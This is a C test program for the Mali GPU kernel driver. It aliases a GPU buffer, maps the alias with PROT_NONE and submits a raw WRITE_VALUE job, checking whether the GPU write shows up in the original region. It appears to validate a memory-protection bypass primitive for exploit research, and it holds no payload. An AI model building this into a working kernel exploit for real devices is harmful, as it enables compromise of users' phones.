/* alias_write_test: validate PROT_NONE alias mmap -> GPU write through alias
 * visible in the original region's CPU mapping.
 */
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <poll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <stdbool.h>

typedef unsigned int __u32;
typedef unsigned short __u16;
typedef unsigned long long __u64;
typedef unsigned char __u8;

#include "mali_trona.h"

struct kbase_ioctl_job_submit { __u64 addr; __u32 nr_atoms; __u32 stride; };
#define KBASE_IOCTL_JOB_SUBMIT _IOW(0x80, 2, struct kbase_ioctl_job_submit)

struct base_dependency { __u8 atom_id; __u8 dependency_type; };
struct base_jd_atom_v2 {
	__u64 jc; __u64 udata[2]; __u64 extres_list;
	__u16 nr_extres; __u16 compat_core_req;
	struct base_dependency pre_dep[2];
	__u8 atom_number, prio, device_nr, padding;
	__u32 core_req;
};
struct base_jd_event_v2 { __u32 event_code; __u8 atom_number; __u8 _pad[3]; __u64 udata[2]; };

#define BASE_JD_REQ_CS 0x2

static int fd;

static void *map_gpu_rw(unsigned int pages)
{
	union kbase_ioctl_mem_alloc ma;
	memset(&ma, 0, sizeof(ma));
	ma.in.flags = BASE_MEM_SAME_VA | BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD |
		      BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_WR;
	ma.in.va_pages = pages;
	ma.in.commit_pages = pages;
	if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, &ma) < 0) { perror("MEM_ALLOC"); return NULL; }
	void *r = mmap(NULL, pages << 12, PROT_READ | PROT_WRITE, MAP_SHARED, fd, ma.out.gpu_va);
	if (r == MAP_FAILED) { perror("mmap"); return NULL; }
	return r;
}

struct job_header { uint32_t a,b,c,d,e,f,g,h; };
static void pack_header(uint32_t *cl, uint32_t type, uint64_t next)
{
	cl[0]=0; cl[1]=0; cl[2]=0; cl[3]=0;
	cl[4] = 1 | (type << 1);
	cl[5] = 0;
	cl[6] = (uint32_t)next; cl[7] = (uint32_t)(next >> 32);
}

struct write_value_payload { uint64_t address, type, immediate_value; };

static int submit_cs(__u64 jc, __u8 id)
{
	struct base_jd_atom_v2 atom;
	memset(&atom, 0, sizeof(atom));
	atom.jc = jc; atom.atom_number = id; atom.core_req = BASE_JD_REQ_CS;
	struct kbase_ioctl_job_submit js = { (__u64)&atom, 1, sizeof(atom) };
	return ioctl(fd, KBASE_IOCTL_JOB_SUBMIT, &js);
}
static int wait_event(void)
{
	struct pollfd pfd = { fd, POLLIN, 0 };
	if (poll(&pfd, 1, 3000) <= 0) return -1;
	struct base_jd_event_v2 ev;
	if (read(fd, &ev, sizeof(ev)) < (int)sizeof(ev)) return -1;
	return ev.event_code;
}

int main(void)
{
	setvbuf(stdout, NULL, _IONBF, 0);
	struct kbase_ioctl_version_check vc = { 999, 999 };
	fd = open("/dev/mali0", O_RDWR);
	if (fd < 0) { perror("open"); return 1; }
	ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &vc);
	struct kbase_ioctl_set_flags sf = { 0 };
	if (ioctl(fd, KBASE_IOCTL_SET_FLAGS, &sf) < 0) { perror("SF"); return 1; }
	mmap(NULL, 0x1000, 0, MAP_SHARED, fd, BASE_MEM_MAP_TRACKING_HANDLE);

	void *region = map_gpu_rw(2);
	void *jc = map_gpu_rw(1);
	if (!region || !jc) return 1;
	*(volatile __u64 *)region = 0;

	/* alias the region (GPU-only on r14) */
	union kbase_ioctl_mem_alias al;
	struct base_mem_aliasing_info ai;
	memset(&al, 0, sizeof(al)); memset(&ai, 0, sizeof(ai));
	al.in.nents = 1;
	al.in.stride = 2;
	al.in.flags = BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR | BASE_MEM_PROT_CPU_RD;
	ai.handle.basep.handle = (__u64)region;
	ai.offset = 0; ai.length = 2;
	al.in.aliasing_info = (__u64)&ai;
	if (ioctl(fd, KBASE_IOCTL_MEM_ALIAS, &al) < 0) { perror("MEM_ALIAS"); return 1; }
	printf("[*] alias cookie = 0x%llx\n", al.out.gpu_va);

	/* PROT_NONE mmap: claims pending region, installs GPU mappings */
	void *am = mmap(NULL, 0x2000, PROT_NONE, MAP_SHARED, fd, al.out.gpu_va);
	if (am == MAP_FAILED) { perror("alias mmap PROT_NONE"); return 1; }
	printf("[*] alias mapped PROT_NONE at %p\n", am);

	/* WRITE_VALUE job targeting the alias's second page */
	memset(jc, 0, 0x1000);
	pack_header((uint32_t *)jc, 2, 0);
	struct write_value_payload pl = {
		.address = (__u64)am + 0x1000,
		.type = 7,
		.immediate_value = 0x1122334455667788ULL,
	};
	memcpy((uint32_t *)jc + 8, &pl, sizeof(pl));

	if (submit_cs((__u64)jc, 1) < 0) { perror("submit"); return 1; }
	int ev = wait_event();
	printf("[*] event=0x%x\n", ev);
	printf("[*] original region page1 = 0x%llx (expect 0x1122334455667788)\n",
	       *((volatile __u64 *)region + 0x1000/8));
	return 0;
}
